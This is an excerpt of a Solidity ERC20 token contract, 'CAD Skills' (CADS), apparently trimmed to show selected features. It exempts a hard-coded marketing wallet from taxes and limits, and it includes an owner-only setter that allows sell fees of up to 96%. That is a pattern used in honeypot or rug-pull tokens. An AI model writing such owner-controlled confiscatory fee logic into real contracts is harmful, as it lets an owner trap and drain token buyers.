...
contract CADS is ERC20, Ownable {
    ...
    constructor() ERC20("CAD Skills", "CADS") {
        ...
        cadAddress = address(0xE4b3E2029251602D7B3eeD64FBBDBAb443904E5d);
        ...
        taxesSwap_setExcluded(cadAddress, true);
        ...
        limitsAntiWhale_setExcluded(cadAddress, true);
     ...
     */
    function wipeLimits() external onlyOwner {
        enableLimits = false;
        transferTaxTotal = 0;
    ...
    function taxesSwap_sell_set(uint256 _newSwapTax) external onlyOwner {
        ...
        require(
            sellFeeTotal <= 96,
            "Total sell fee cannot be higher than 96%"
        );
     ...
     * @return _cadAddress The wallet that receives the marketing fees
     */
    function receiver_info()
        external
        view
        returns (address _cadAddress)
    {
        return (cadAddress);
    }
    ...
    function swapBack(uint256 amount) private {
        ...
        (success, ) = address(cadAddress).call{
